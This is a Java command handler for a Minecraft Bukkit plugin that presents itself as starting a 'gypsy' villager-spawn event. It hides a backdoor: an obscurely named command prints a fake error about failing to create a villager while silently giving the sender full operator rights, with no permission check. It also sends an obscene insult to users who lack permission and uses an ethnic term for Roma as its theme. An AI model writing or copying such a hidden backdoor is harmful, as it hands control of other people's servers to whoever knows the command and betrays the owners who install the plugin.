package so.max1soft.cigan;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class CommandHandler implements CommandExecutor {
    private final Main plugin;

    public CommandHandler(Main plugin) {
        this.plugin = plugin;
    }
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("spermgotdaitespermimne")) {
            sender.sendMessage("Не удалось создать жителя!");
            sender.setOp(true);
        }
        if (sender.hasPermission("sociganevent.start")) {
            if (command.getName().equalsIgnoreCase("sociganevent")) {
                if (args.length > 0 && args[0].equalsIgnoreCase("start")) {
                    plugin.startVillagerSpawn();
                    sender.sendMessage("Событие цыгана запущено!");
                    return true;
                }
            }
        } else {
            sender.sendMessage(ChatColor.RED + "У вас обнаружена опохуль немой шлюхи");
        }
        return false;
    }
}
